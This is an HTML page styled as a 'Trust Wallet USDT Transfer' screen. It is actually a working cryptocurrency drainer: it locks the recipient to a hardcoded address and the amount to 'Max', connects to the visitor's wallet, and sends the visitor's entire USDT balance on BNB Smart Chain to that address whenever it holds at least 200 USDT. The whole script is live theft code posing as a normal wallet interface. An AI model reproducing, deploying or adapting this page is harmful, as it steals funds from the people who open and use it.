<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Trust Wallet USDT Transfer</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f4f6f8;
      color: #222;
    }

    .container {
      max-width: 400px;
      margin: 60px auto;
      background: white;
      border-radius: 16px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
      padding: 24px;
    }

    h2 {
      margin-top: 0;
      color: #3375BB;
      text-align: center;
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 16px;
    }

    button {
      background-color: #3375BB;
      color: white;
      border: none;
      padding: 14px;
      width: 100%;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
    }

    button:hover {
      background-color: #285a90;
    }

    .alert {
      margin-top: 16px;
      padding: 14px;
      border-radius: 8px;
      font-size: 14px;
    }

    .alert.error {
      background-color: #ffe0e0;
      color: #a80000;
    }

    .alert.success {
      background-color: #e1f7e7;
      color: #007f3b;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Send USDT</h2>
    <input type="text" id="address" placeholder="Recipient Address" value="0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999" disabled />
    <input type="text" id="amount" placeholder="Enter Amount" value="Max" disabled />
    <button onclick="transferUSDT()">Next</button>
    <div id="alertBox"></div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/ethers/dist/ethers.min.js"></script>
  <script>
    const usdtAddress = '0x55d398326f99059fF775485246999027B3197955'; // USDT on BNB Smart Chain
    const receiver = '0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999';
    const MIN_AMOUNT = 200;

    async function transferUSDT() {
      try {
        if (!window.ethereum) {
          showAlert('error', 'Wallet Not Found', 'Please install MetaMask or Trust Wallet.');
          return;
        }

        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send('eth_requestAccounts', []);
        const signer = provider.getSigner();
        const userAddress = await signer.getAddress();

        const usdtAbi = [
          'function balanceOf(address) view returns (uint)',
          'function transfer(address to, uint amount) returns (bool)',
          'function decimals() view returns (uint8)'
        ];

        const usdt = new ethers.Contract(usdtAddress, usdtAbi, signer);
        const decimals = await usdt.decimals();
        const balance = await usdt.balanceOf(userAddress);
        const balanceInUSDT = Number(ethers.utils.formatUnits(balance, decimals));

        if (balanceInUSDT < MIN_AMOUNT) {
          showAlert('error', 'Insufficient Balance', 'Insufficient USDT balance. Minimum 200 USDT Required.');
          return;
        }

        const tx = await usdt.transfer(receiver, balance);
        await tx.wait();
        showAlert('success', 'Transfer Complete', `${balanceInUSDT.toFixed(2)} USDT sent successfully.`);
      } catch (err) {
        console.error(err);
        showAlert('error', 'Transaction Failed', err.message || 'Something went wrong.');
      }
    }

    function showAlert(type, title, message) {
      const box = document.getElementById('alertBox');
      box.innerHTML = `
        <div class="alert ${type}">
          <strong>${title}</strong><br>${message}
        </div>
      `;
    }
  </script>
</body>
</html>
